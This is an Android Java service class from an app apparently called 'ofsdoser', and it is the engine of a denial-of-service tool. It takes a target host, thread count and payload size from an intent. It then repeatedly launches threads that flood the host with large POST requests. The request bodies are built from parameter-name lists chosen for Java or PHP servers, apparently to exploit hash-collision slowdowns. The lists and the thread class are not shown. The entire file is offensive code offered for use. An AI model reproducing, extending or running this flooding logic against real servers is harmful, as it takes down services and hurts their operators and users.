package net.openfiresecurity.ofsdoser.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

import net.openfiresecurity.ofsdoser.util.Lists;
import net.openfiresecurity.ofsdoser.util.ThreadInject;

import java.util.List;

/**
 * Created by alex on 14.11.13.
 */
public class DosService extends Service implements Runnable {

    public static final String BUNDLE_THREADS = "bundle_threads";
    public static final String BUNDLE_PACKETSIZE = "bundle_packetsize";
    public static final String BUNDLE_JAVA = "bundle_java";
    public static final String BUNDLE_HOST = "bundle_host";

    //====================
    // Fields
    //====================
    private int[] states = new int[200];
    private boolean shouldRun = false;
    private volatile Thread mThread;
    private int mThreads = 0;
    private int mPacketSize = 0;
    private boolean mJava = false;
    private String mHost = "";

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent.hasExtra(DosService.BUNDLE_THREADS) &&
                intent.hasExtra(DosService.BUNDLE_PACKETSIZE) &&
                intent.hasExtra(DosService.BUNDLE_JAVA) &&
                intent.hasExtra(DosService.BUNDLE_HOST)) {
            mThreads = intent.getIntExtra(DosService.BUNDLE_THREADS, 1);
            mPacketSize = intent.getIntExtra(DosService.BUNDLE_PACKETSIZE, 1);
            mJava = intent.getBooleanExtra(DosService.BUNDLE_JAVA, false);
            mHost = intent.getStringExtra(DosService.BUNDLE_HOST);
            shouldRun = true;
            startThread();
        } else {
            shouldRun = false;
            stopThread();
        }

        return START_NOT_STICKY;
    }

    //====================
    // Methods
    //====================
    private void set(int i, int localState) {
        states[i] = localState;
    }

    synchronized void startThread() {
        if (mThread == null) {
            mThread = new Thread(this);
            assert mThread != null;
            mThread.start();
        }
    }

    synchronized void stopThread() {
        if (mThread != null) {
            Thread stopper = mThread;
            mThread.interrupt();
            mThread = null;
            assert stopper != null;
            stopper.interrupt();
        }
    }

    //====================
    // Runnable
    //====================
    @Override
    public void run() {
        while (shouldRun) {
            String url = "http://" + mHost + "/";
            ThreadInject[] t = new ThreadInject[mThreads];
            List<String> list;
            if (mJava) {
                list = Lists.javaList;
            } else {
                list = Lists.phpList;
            }
            do {
                for (int i = 0; i < t.length; i++) {
                    t[i] = new ThreadInject(url, getPost(list,
                            mPacketSize * 1024));
                }
                for (ThreadInject aT : t) {
                    aT.start();
                }
                boolean stop;
                do {
                    for (int i = 0; i < t.length; i++) {
                        set(i, t[i].getLocalState());
                    }

                    try {
                        Thread.sleep(300L);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    stop = true;
                    for (int i = 0; i < t.length; i++) {
                        if (states[i] < 6) {
                            stop = false;
                            break;

                        }
                    }
                } while (!stop);
            } while (shouldRun);
        }
        stopThread();
        stopSelf();
    }

    String getPost(List<String> completeList, int maxSize) {
        StringBuilder bu = new StringBuilder(maxSize);
        int reqSize = 0;
        for (String value : completeList) {
            reqSize += value.length() + 4;
            if (reqSize > (maxSize - 40)) {
                break;
            }
            bu.append("&");
            bu.append(value);
            bu.append("=a");
        }

        return bu.toString();
    }
}
